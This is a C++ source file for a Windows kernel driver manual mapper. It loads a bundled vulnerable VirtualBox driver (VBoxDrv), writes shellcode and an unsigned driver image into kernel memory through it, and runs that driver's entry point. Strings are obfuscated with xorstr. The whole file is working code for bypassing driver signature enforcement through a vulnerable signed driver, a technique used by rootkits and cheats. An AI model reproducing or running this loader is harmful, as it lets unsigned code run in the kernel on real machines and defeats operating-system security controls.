#include "includes.h"

NTSTATUS injected_shellcode( PMAPPER_DATA ptr_mapper_data )
{
	if ( !ptr_mapper_data )
		return STATUS_INVALID_PARAMETER;
	
	if ( ptr_mapper_data->return_address )
	{
		const auto old_cr8 = __readcr8( );
		__writecr8( PASSIVE_LEVEL );

		const auto ptr_base = rc<char*>( ptr_mapper_data->_ExAllocatePoolWithTag( NonPagedPool, ptr_mapper_data->data_size, 'ediW' ) );
		for ( auto i = 0; i < ptr_mapper_data->data_size; i++ )
			ptr_base[ i ] = 0;

		PEPROCESS ptr_process;
		auto status = ptr_mapper_data->_PsLookupProcessByProcessId( ptr_mapper_data->process_id, &ptr_process );
		if ( !NT_SUCCESS( status ) )
		{
			ptr_mapper_data->_ExFreePoolWithTag( ptr_base, 'ediW' );

			return status;
		}

		size_t copied_bytes = 0;
		status = ptr_mapper_data->_MmCopyVirtualMemory( ptr_process, ptr_mapper_data->data_address, ptr_mapper_data->_IoGetCurrentProcess( ),
														ptr_base, ptr_mapper_data->data_size, KernelMode, &copied_bytes );
		if ( !NT_SUCCESS( status ) )
		{
			ptr_mapper_data->_ExFreePoolWithTag( ptr_base, 'ediW' );

			return status;
		}
		
		const auto ptr_nt_headers = rc<PIMAGE_NT_HEADERS>( ptr_base + rc<PIMAGE_DOS_HEADER>( ptr_base )->e_lfanew );
		const auto _FileMain = rc<NTSTATUS( NTAPI* ) ( void*, LOADER_DATA* )>( ptr_base + ptr_nt_headers->OptionalHeader.AddressOfEntryPoint );

		if ( ptr_nt_headers->OptionalHeader.DataDirectory[ IMAGE_DIRECTORY_ENTRY_BASERELOC ].Size )
		{
			const auto location_delta = rc<uintptr_t>( ptr_base - ptr_nt_headers->OptionalHeader.ImageBase );

			for ( auto ptr_reloc_block = rc<PIMAGE_BASE_RELOCATION>( ptr_base + ptr_nt_headers->OptionalHeader.DataDirectory[ IMAGE_DIRECTORY_ENTRY_BASERELOC ].VirtualAddress );
				location_delta && ptr_reloc_block->VirtualAddress;
				ptr_reloc_block = rc<PIMAGE_BASE_RELOCATION>( rc<char*>( ptr_reloc_block ) + ptr_reloc_block->SizeOfBlock ) )
			{
				const auto entries_num = ( ptr_reloc_block->SizeOfBlock - sizeof( IMAGE_BASE_RELOCATION ) ) / sizeof( IMAGE_BASE_RELOCATION_INFO );
				const auto ptr_relock_info_array = reinterpret_cast< PIMAGE_BASE_RELOCATION_INFO >( ptr_reloc_block + 1 );

				for ( auto i = 0; i < entries_num; i++ )
				{
					if ( ptr_relock_info_array[ i ].type != IMAGE_REL_BASED_DIR64 )
						continue;

					ptr_relock_info_array[ i ].virtual_address += location_delta;
				}
			}
		}

		status = _FileMain( ptr_base, &ptr_mapper_data->loader_data );

		__writecr8( old_cr8 );

		return status;
	}

	const auto return_address = get_rip( );

	ptr_mapper_data->return_address = rc<uintptr_t>( return_address );
}

bool manual_map( File* ptr_file, PEParser* ptr_peparser )
{
	printf( xorstr( "\nLoading Vulnerable Driver" ).c_str( ) );

	auto drv_rc_handle = FindResourceW( GetModuleHandle( nullptr ), MAKEINTRESOURCEW( IDR_RT_DRIVER1 ), L"RT_DRIVER" );
	if ( !drv_rc_handle )
		return false;

	auto drv_size = SizeofResource( GetModuleHandle( nullptr ), drv_rc_handle );
	if ( !drv_size )
		return false;

	auto drv_data_handle = LoadResource( GetModuleHandle( nullptr ), drv_rc_handle );
	if ( !drv_data_handle )
		return false;

	auto ptr_drv_data = rc<uint8_t*>( LockResource( drv_data_handle ) );
	if ( !ptr_drv_data )
		return false;

	wchar_t sys_path[ MAX_PATH ];
	if ( !GetSystemDirectoryW( rc<LPWSTR>( &sys_path ), MAX_PATH ) )
		return false;

	auto path_buffer = std::wstring( sys_path ) + xorstr( L"\\drivers\\" ).c_str( );

	if ( !loader::load_driver( ptr_drv_data, drv_size, path_buffer, xorstr( L"VBoxDrv" ).c_str( ) ) )
	{
		loader::unload_driver( path_buffer, xorstr( L"VBoxDrv" ).c_str( ) );

		return false;
	}

	printf( xorstr( "\nInitializing VBox Interface" ).c_str( ) );

	auto vbox_interface = new IVBox( );

	if ( !vbox_interface->open( ) )
	{
		loader::unload_driver( path_buffer, xorstr( L"VBoxDrv" ).c_str( ) );

		return false;
	}

	if ( !vbox_interface->begin_session( ) )
	{
		vbox_interface->close( );

		loader::unload_driver( path_buffer, xorstr( L"VBoxDrv" ).c_str( ) );

		return false;
	}

	printf( xorstr( "\nVBox Interface Initialized!" ).c_str( ) );

	MAPPER_DATA mapper_data;
	ZeroMemory( &mapper_data, sizeof( MAPPER_DATA ) );

	injected_shellcode( &mapper_data );

	const auto shellcode_size = ( mapper_data.return_address - rc<uintptr_t>( injected_shellcode ) ) + 10; // 10 -> mov rcx, ptr_mapper_data
	const auto ldr_size       = shellcode_size + sizeof( MAPPER_DATA );
	if ( !ldr_size )
	{
		vbox_interface->close( );

		loader::unload_driver( path_buffer, xorstr( L"VBoxDrv" ).c_str( ) );

		return false;
	}

	printf( xorstr( "\nAllocating Memory on User Space" ).c_str( ) );

	auto ptr_ldr_base = rc<char*>( VirtualAlloc( nullptr, ldr_size, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE ) );
	if ( !ptr_ldr_base )
	{
		vbox_interface->close( );

		loader::unload_driver( path_buffer, xorstr( L"VBoxDrv" ).c_str( ) );

		return false;
	}

	printf( xorstr( "\nMemory Allocated at 0x%p\nWriting Shellcode to memory" ).c_str( ), ptr_ldr_base );

	memcpy( ptr_ldr_base, "\x48\xB9", 2 );
	memcpy( ptr_ldr_base + 10, injected_shellcode, shellcode_size - 10 );

	printf( xorstr( "\nMapping the Driver" ).c_str( ) );

	auto ptr_image_base = rc<char*>( VirtualAlloc( nullptr, ptr_peparser->get_image_size( ), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE ) );
	if ( !ptr_image_base )
	{
		VirtualFree( ptr_ldr_base, NULL, MEM_RELEASE );

		vbox_interface->close( );

		loader::unload_driver( path_buffer, xorstr( L"VBoxDrv" ).c_str( ) );

		return false;
	}

	ptr_peparser->map( ptr_image_base );

	printf( xorstr( "\nResolving File Imports" ).c_str( ) );

	const auto ptr_nt_headers = ptr_peparser->get_nt_headers( );
	const auto ptr_optional_header = &( ptr_peparser->get_nt_headers( )->OptionalHeader );

	if ( ptr_optional_header->DataDirectory[ IMAGE_DIRECTORY_ENTRY_IMPORT ].Size )
	{
		for ( auto ptr_import_descriptor = rc<PIMAGE_IMPORT_DESCRIPTOR>( ptr_image_base + ptr_optional_header->DataDirectory[ IMAGE_DIRECTORY_ENTRY_IMPORT ].VirtualAddress );
			  ptr_import_descriptor->Name;
			  ptr_import_descriptor++ )
		{
			const auto import_module_name = ( rc<char*>( ptr_image_base + ptr_import_descriptor->Name ) );

			auto ptr_original_thunk = rc<PIMAGE_THUNK_DATA>( ptr_image_base + ptr_import_descriptor->OriginalFirstThunk );
			auto ptr_first_thunk = rc<PIMAGE_THUNK_DATA>( ptr_image_base + ptr_import_descriptor->FirstThunk );

			if ( !ptr_original_thunk )
				ptr_original_thunk = ptr_first_thunk;

			for ( ; ptr_original_thunk->u1.AddressOfData; ptr_original_thunk++, ptr_first_thunk++ )
				ptr_first_thunk->u1.Function = IMAGE_SNAP_BY_ORDINAL( ptr_original_thunk->u1.Ordinal ) ?
				utils::get_kernel_module_function( import_module_name, ptr_original_thunk->u1.Ordinal + 1 ) :
				utils::get_kernel_module_function( import_module_name, NULL, rc<PIMAGE_IMPORT_BY_NAME>( ptr_image_base + ptr_original_thunk->u1.ForwarderString )->Name );
		}
	}

	printf( xorstr( "\nAllocating Memory on Kernel Space" ).c_str( ) );

	const auto ldr_base = vbox_interface->allocate_ldr( ldr_size );
	if ( !ldr_base )
	{
		VirtualFree( ptr_image_base, NULL, MEM_RELEASE );

		VirtualFree( ptr_ldr_base, NULL, MEM_RELEASE );

		vbox_interface->close( );

		loader::unload_driver( path_buffer, xorstr( L"VBoxDrv" ).c_str( ) );

		return false;
	}

	printf( xorstr( "\nMemory allocated at 0x%p" ).c_str( ), ldr_base );

	mapper_data._ExFreePoolWithTag = rc<void( * ) ( PVOID, ULONG )>(
		utils::get_kernel_module_function( xorstr( "ntoskrnl.exe" ).c_str( ), NULL, xorstr( "ExFreePoolWithTag" ).c_str( ) ) );
	mapper_data._ExAllocatePoolWithTag = rc<PVOID( * ) ( POOL_TYPE, SIZE_T, ULONG )>(
		utils::get_kernel_module_function( xorstr( "ntoskrnl.exe" ).c_str( ), NULL, xorstr( "ExAllocatePoolWithTag" ).c_str( ) ) );
	mapper_data._MmCopyVirtualMemory = rc<NTSTATUS( * ) ( PEPROCESS, PVOID, PEPROCESS, PVOID, SIZE_T, KPROCESSOR_MODE, PSIZE_T )>(
		utils::get_kernel_module_function( xorstr( "ntoskrnl.exe" ).c_str( ), NULL, xorstr( "MmCopyVirtualMemory" ).c_str( ) ) );
	mapper_data._IoGetCurrentProcess = rc<PEPROCESS( * ) ( )>(
		utils::get_kernel_module_function( xorstr( "ntoskrnl.exe" ).c_str( ), NULL, xorstr( "IoGetCurrentProcess" ).c_str( ) ) );
	mapper_data._PsLookupProcessByProcessId = rc<NTSTATUS( * ) ( HANDLE, PEPROCESS* )>(
		utils::get_kernel_module_function( xorstr( "ntoskrnl.exe" ).c_str( ), NULL, xorstr( "PsLookupProcessByProcessId" ).c_str( ) ) );

	mapper_data.data_size    = ptr_peparser->get_image_size( );
	mapper_data.data_address = ptr_image_base;
	mapper_data.process_id   = rc<HANDLE>( GetCurrentProcessId( ) );

	wcscpy( mapper_data.loader_data.driver_name, xorstr( L"VBoxDrv" ).c_str( ) );
	mapper_data.loader_data.memory_pool = ldr_base - 0x7F;
	mapper_data.loader_data.memory_size = ldr_size + 0x7F;

	memcpy( ptr_ldr_base + shellcode_size, &mapper_data, sizeof( MAPPER_DATA ) );

	*rc<uintptr_t*>( ptr_ldr_base + 2 ) = ldr_base + shellcode_size;

	printf( xorstr( "\nCopying Data to Kernel Space" ).c_str( ) );

	if ( !vbox_interface->load_ldr( ldr_base, rc<uintptr_t*>( ptr_ldr_base ), ldr_size ) )
	{
		vbox_interface->free_ldr( ldr_base );

		VirtualFree( ptr_image_base, NULL, MEM_RELEASE );

		VirtualFree( ptr_ldr_base, NULL, MEM_RELEASE );

		vbox_interface->close( );

		loader::unload_driver( path_buffer, xorstr( L"VBoxDrv" ).c_str( ) );

		return false;
	}

	printf( xorstr( "\nSetting VM for Fast" ).c_str( ) );

	if ( vbox_interface->set_vm_for_fast( ) )
	{
		printf( xorstr( "\nRunning EntryPoint" ).c_str( ) );

		Sleep( 1000 );

		auto status = vbox_interface->run_entry( );

		wchar_t buffer[ 64000 ];
		if ( !FormatMessageW( FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_FROM_HMODULE, LoadLibraryW( xorstr( L"ntdll.dll" ).c_str( ) ), status,
						LANG_USER_DEFAULT, buffer, sizeof( buffer ) / sizeof( wchar_t ), nullptr ) )
			printf( xorstr( "\nDriver EntryPoint attempted to Execute with Return Code 0x%X" ).c_str( ), status );
		else
			printf( xorstr( "\nDriver EntryPoint attempted to Execute with Return Code 0x%X | %ws" ).c_str( ), status, buffer );
	}

	printf( xorstr( "\nCleaning Image" ).c_str( ) );

	vbox_interface->free_ldr( ldr_base );

	VirtualFree( ptr_image_base, NULL, MEM_RELEASE );

	VirtualFree( ptr_ldr_base, NULL, MEM_RELEASE );

	vbox_interface->close( );

	loader::unload_driver( path_buffer, xorstr( L"VBoxDrv" ).c_str( ) );

	return true;
}